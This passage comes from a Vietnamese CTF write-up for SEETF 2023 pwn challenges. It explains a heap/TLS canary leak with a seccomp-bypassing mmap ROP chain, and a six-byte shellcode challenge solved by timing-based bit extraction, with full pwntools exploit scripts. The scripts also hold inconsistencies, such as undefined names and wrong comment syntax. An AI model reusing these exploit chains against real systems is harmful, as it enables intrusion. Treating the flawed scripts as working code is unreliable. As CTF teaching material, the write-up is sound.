p64(0x5f6de) + p64(put_gots+0x3d) + p64(0)*4 + p64(add_what_where) + p64(elf.sym[\u0026#39;puts\u0026#39;]) value = \u0026#39;3.544850151698461e-38\u0026#39; io.sendafter(b\u0026#39;ale.\\n\u0026#39;,payload) io.sendlineafter(b\u0026#39;number!\\n\u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;number!\\n\u0026#39;, value.encode()) io.sendlineafter(b\u0026#39;number!\\n\u0026#39;, b\u0026#39;+\u0026#39;)\tio.interactive() except: io.close() $ flag: see{im_f33ling_1ucky_e27e006fe918ab56}\nmmap note description: i made a basic note program but with sandbox. and no more chunk for house of xxx. can you still get the flag?\nở bài này, chúng ta có thể allocate 1 số chunks với size 0x1000. nếu phân bổ hết lượng bộ nhớ trên heap và khiến cho chunks mới phải dùng mmaped(). điều đó khiến ta có 1 số chunk nằm trên thread local storage (tls) được đặt với 1 offset không đổi so với libc trong vùng nhớ.\n__int64 write_0() { unsigned int v1; // [rsp+4h] [rbp-ch] byref unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); v1 = 0; printf(\u0026#34;idx = \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v1); if ( v1 \u0026lt; dword_404590 ) { printf(\u0026#34;size to write = \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;sizes[v1]); if ( sizes[v1] \u0026lt;= 4096 ) { read(0, (void *)chunk[v1], sizes[v1]); return 1ll; } else { puts(\u0026#34;too much\u0026#34;); return 0ll; } } else { puts(\u0026#34;invalid idx\u0026#34;); return 0ll; } } lỗi thứ 2 ở hàm write(), ta thấy lỗi integer overflow, nên chúng ta có thể đọc nhiều hơn 0x1000 bytes. điều này cho phép ta có thể đọc được cả canary được lưu giữ trong 1 offset cố định trên tls (vì hàm write in ra cả nullbyte). sau đó, chúng ta dùng để dùng rop chain open-\u0026gt;read-\u0026gt;write để ánh xạ file flag vào bộ nhớ chương trình và xuất nó ra thiết bị xuất chuẩn.\noops, chúng ta lại không có read() để đọc file vào bộ nhớ (vì chương trình đã dùng seccomp để chặn các hàm đó lại). may mắn thay, em tìm thấy bài viết này link. dùng mmap() để read() file. ok, vậy mọi thứ đã rõ ràng rồi, mình tiến hành exploit:\nsolve scripts\n#!/usr/bin/env python3 from pwn import * from ctypes import * import time import sys local = 0 debug = 0 context.arch = \u0026#39;amd64\u0026#39; # context.aslr = false # context.log_level = \u0026#39;debug\u0026#39; # context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;, \u0026#39;-f\u0026#39; \u0026#39;#{pane_pid}\u0026#39;, \u0026#39;-p\u0026#39;] # context.timeout = 2 def riconn(): global local global debug for arg in sys.argv[1:]: if arg in (\u0026#39;-l\u0026#39;, \u0026#39;--local\u0026#39;): local = 1 if arg in (\u0026#39;-d\u0026#39;, \u0026#39;--debug\u0026#39;): debug = 1 if local: io = process(\u0026#39;./chall_patched\u0026#39;) if debug: gdb.attach(s, gdbscript=\u0026#39;\u0026#39;\u0026#39; b* 0x0000000000401930 b* 0x0000000000401953 continue \u0026#39;\u0026#39;\u0026#39;) else: raw_input(\u0026#39;debug\u0026#39;) else: io = remote(\u0026#39;win.the.seetf.sg\u0026#39;, 2002) return io io = conn() elf = elf(\u0026#39;./chall_patched\u0026#39;) libc = elf(\u0026#39;libc.so.6\u0026#39;) pop_rax = 0x0000000000401491 pop_rdi = 0x000000000040148f pop_rsi = 0x0000000000401493 pop_rsp = 0x00000000004014a0 pop_r10 = 0x0000000000401497 pop_r8 = 0x000000000040149a pop_r9 = 0x000000000040149d pop_rdx = 0x0000000000401495 sys_call = 0x00000000004014a8 # stage 1 : leak canary and libc : def create_note(): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) def write_note(idx, size=0x1000): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;idx = \u0026#39;, str(idx).encode()) io.sendlineafter(b\u0026#39;size to write = \u0026#39;, f\u0026#34;{size}\u0026#34;.encode()) def read_note(idx): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;idx = \u0026#39;, str(idx).encode()) for i in range(30): create_note() if i ==0: p.recvuntil(b\u0026#34;addr of note 0 is 0x\u0026#34;) addr_0=int(p.recvuntil(b\u0026#34;\\n\u0026#34;).rstrip().decode(),16) sleep(0.1) write_note(0, size=100, b\u0026#39;flag\\0\u0026#39;) write_note(3, size=0x1740+0x100) read_note(3) for i in range(0x10): io.recv(0x100) log.info(\u0026#34;\u0026#34;) sleep(0.5) sleep(1) io.recv(0x760+9-1) sleep(1) canary = u64(io.recv(8)) log.info(f\u0026#34;canary = {hex(canary)}\u0026#34;) payload = b\u0026#39;a\u0026#39;*24 // fill buff and saved_rbp payload += flat(pop_rax, 2, pop_rdi, base+0xf00, pop_rsi, 0, pop_rdx, 0,\\ syscall_ret, pop_rax, 9, pop_rdi, 0x13370000, pop_rsi, 0x1000,\\ # open pop_rdx, 7, pop_r10, 2, pop_r8, 3, pop_r9, 0, syscall_ret,\\ # mmap pop_rax, 1, pop_rdi, 1, pop_rsi, 0x13370000, pop_rdx, 0x40, syscall_ret) # write io.sendline(payload) io.sendline(b\u0026#39;4\u0026#39;) io.interactive() $ flag: see{m4st3r_0f_mm4p_5ee2a719bc6a8209e7295d4095ff5181}\nshellcode as a service description: hey, welcome to my new saas platform! as part of our early access program, we are offering the service for free. our generous free tier gives you a whole six bytes of shellcode to run on our server. what are you waiting for? sign up now!\nnhư chương trình đã mô tả, chúng ta phải viết shellcode sẽ được đưa vào để thực thi. được cấp cho 6 bytes và có cho phép 2 syscall open, read, ngăn chặn chúng ta in flag ra màn hình. ý tưởng là chúng ta sẽ viết 1 vòng lặp để kiểm tra từng bit của flag, nếu bit bằng 1 sẽ cho vào 1 vòng lặp, còn ngược lại thì bit bằng 0. một cách khác là ta sẽ đọc từng bytes của flag rồi kiểm tra từng kí tự của flag.\nngay lúc này, thanh ghi rdi đang có giá trị bằng 0, rdx thì là địa chỉ nơi mà shellcode chúng ta ghi nên chúng ta chỉ cần lấy giá trị đó là đủ để ghi tiếp (second stage write).\nsolve scripts\nfrom pwn import * import struct #!/usr/bin/env python3 from pwn import * from ctypes import * import time import sys local = 0 debug = 0 context.arch = \u0026#39;amd64\u0026#39; # context.aslr = false # context.log_level = \u0026#39;debug\u0026#39; # context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;, \u0026#39;-f\u0026#39; \u0026#39;#{pane_pid}\u0026#39;, \u0026#39;-p\u0026#39;] # context.timeout = 2 def riconn(): global local global debug for arg in sys.argv[1:]: if arg in (\u0026#39;-l\u0026#39;, \u0026#39;--local\u0026#39;): local = 1 if arg in (\u0026#39;-d\u0026#39;, \u0026#39;--debug\u0026#39;): debug = 1 if local: io = process(\u0026#39;./chall\u0026#39;) if debug: gdb.attach(s, gdbscript=\u0026#39;\u0026#39;\u0026#39; \u0026#39;\u0026#39;\u0026#39;) else: raw_input(\u0026#39;debug\u0026#39;) else: io = remote(\u0026#39;103.162.14.240\u0026#39;, 15001) return io elf = elf(\u0026#39;./chall\u0026#39;) #libc = elf(\u0026#39;libc.so.6\u0026#39;) def chill(offset): bin = \u0026#39;\u0026#39; for bit in range(8): io = riconn() stage1 = asm(f\u0026#34;\u0026#34;\u0026#34; xor edi, edi mov esi, edx syscall \u0026#34;\u0026#34;\u0026#34;, arch=\u0026#39;amd64\u0026#39;) io.send(stage1) stage2 = asm((\u0026#34;\u0026#34;\u0026#34; .rept 0x6 nop .endr \u0026#34;\u0026#34;\u0026#34; + shellcraft.amd64.linux.open(\u0026#39;/flag\u0026#39;) + shellcraft.amd64.linux.read(\u0026#39;rax\u0026#39;, \u0026#39;rsp\u0026#39;, 0x100) + f\u0026#34;\u0026#34;\u0026#34; xor r11, r11 xor rax, rax mov al, [rsp+{offset}] shr al, {bit} shl al, 7 shr al, 7 loop: cmp rax, r11 je end jmp loop end: \u0026#34;\u0026#34;\u0026#34; ), arch=\u0026#39;amd64\u0026#39;) io.send(stage2) start = time.time() io.recvall(timeout=1).decode() now = time.time() if (now - start) \u0026gt; 1: bin += \u0026#39;1\u0026#39; else: bin += \u0026#39;0\u0026#39; byte = int(bin[::-1], 2) return byte tmp = [] for i in range(100): tmp.append(chill(i)) if tmp[-1] == \u0026#39;}\u0026#39;: break flag = [x.decode(\u0026#39;utf-8\u0026#39;) for x in tmp] flag = \u0026#39;\u0026#39;.join(flag) $ flag: see{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}\n","title":"SEETF 2023"}]
}

